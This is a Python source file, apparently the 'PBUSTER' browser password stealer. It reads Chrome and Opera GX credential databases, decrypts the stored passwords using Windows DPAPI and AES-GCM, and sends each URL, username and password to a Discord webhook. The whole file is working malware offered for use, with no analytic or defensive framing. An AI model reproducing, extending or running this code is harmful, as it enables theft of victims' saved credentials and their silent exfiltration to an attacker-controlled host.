import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import os
import shutil
import requests

webhook_url = ""  # Add your discord webhook URL here

def decrypt_password(encrypted_password, key):
    try:
        nonce, ciphertext_tag = encrypted_password[3:15], encrypted_password[15:]
        ciphertext, tag = ciphertext_tag[:-16], ciphertext_tag[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_data.decode("utf-8")
    except Exception as e:
        return f"Error decrypting password: {e}"

info = (
    "======================================================================================================\n"
    "=> PBUSTER by KaazDW : https://github.com/KaazDW/P-Buster-Password-Stealer : https://github.com/KaazDW"
)
if not(webhook_url):
    print(info)
def extract_passwords(browser_name, local_state_path, login_data_path):
    try:
        temp_db_path = "temp_login_data.db"
        shutil.copy2(login_data_path, temp_db_path)

        with open(local_state_path, "r") as file:
            local_state = json.load(file)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")



        for origin_url, username, encrypted_password in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            output = (
                f"======================================================================================================\n"
                f"[{browser_name}] Extracted Data:\n"
                f"URL: {origin_url}\n"
                f"Username: {username}\n"
                f"Password: {password}"
            )

            if webhook_url:
                payload = {"content": output}
                response = requests.post(webhook_url, json=payload)
                if response.status_code != 204:
                    print(f"Failed to export data: {response.status_code}, {response.text}")
            else:
                print(output)

        conn.close()
        os.remove(temp_db_path)
    except Exception as e:
        print(f"Error processing {browser_name}: {e}")



def display_author_info():
    if webhook_url:
        payload = {"content": info}
        requests.post(webhook_url, json=payload) 

chrome_local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Local State')
chrome_login_data_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Login Data')
opera_local_state_path = os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera GX Stable\Local State')
opera_login_data_path = os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera GX Stable\Login Data')

display_author_info()
extract_passwords("Google Chrome", chrome_local_state_path, chrome_login_data_path)
extract_passwords("Opera GX", opera_local_state_path, opera_login_data_path)
# i will add brave and IE later